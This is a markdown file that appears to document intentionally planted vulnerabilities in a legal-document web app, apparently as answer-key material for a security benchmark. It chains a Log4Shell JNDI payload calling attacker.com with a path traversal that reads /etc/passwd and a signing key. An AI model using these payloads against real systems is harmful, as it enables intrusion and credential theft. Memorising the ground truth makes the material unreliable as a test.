# Chained Vulnerability Scenarios — Legal Documents

## Chain: "Log4Shell Trigger → Path Traversal → Legal Document Exfiltration"

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | Case title is logged verbatim via `logger.info("Creating case: " + dto.getTitle())` using Log4j 2.14.1; a title containing `${jndi:ldap://attacker.com/x}` triggers a JNDI lookup (Log4Shell RCE) | Medium | A06 | `CaseController.java` → `createCase()` |
| 2 | `GET /api/documents/file?name=` concatenates the parameter directly to `/app/legal-documents/` without `Path.normalize()` or a prefix check; allows `../../etc/passwd` or any server path | High | A01 | `DocumentController.java` → `serveDocumentFile()` |


**Attack narrative**: An attacker with an attorney account submits a `POST /api/cases` request whose `title` field contains a JNDI expression pointing to an attacker-controlled LDAP server. The Log4j 2.14.1 logger evaluates the expression, establishing an outbound connection; a loaded class executes a payload that calls `GET /api/documents/file?name=../../app/keys/signing.key` to exfiltrate the document signing key, enabling the attacker to forge legal document signatures.

**Combined Impact**: Remote code execution and full server-side file exfiltration including privileged credential files.

---

_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
